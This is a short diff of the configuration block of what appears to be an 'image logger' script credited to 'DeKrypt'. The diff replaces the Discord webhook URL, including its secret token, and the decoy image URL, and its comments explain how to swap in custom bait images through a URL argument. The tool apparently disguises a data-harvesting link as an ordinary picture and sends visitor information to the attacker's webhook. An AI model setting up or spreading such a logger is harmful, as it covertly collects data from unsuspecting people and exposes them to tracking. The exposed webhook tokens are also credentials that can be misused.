@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discordapp.com/api/webhooks/1444732365011161088/HG4vEGdmXRUnW3lwOGyldA8tcGWr-egSVx5Rhmkg93ZIlDt3Xx7l4lWQ98amnktgXf2h ",
-    "image": "https://static01.nyt.com/images/2025/08/14/12visualUploader-8432-cover/12visualUploader-8432-cover-jumbo-v2.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1444773371576320201/ISTZPaVpaVf50OQvy4eBIJZUIvuNnScsEGGxehieWVOrxPtG_CPgCfN1o3zhyfqXlZwx",
+    "image": "https://c4.wallpaperflare.com/wallpaper/295/163/719/anime-anime-boys-picture-in-picture-kimetsu-no-yaiba-kamado-tanjir%C5%8D-hd-wallpaper-preview.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
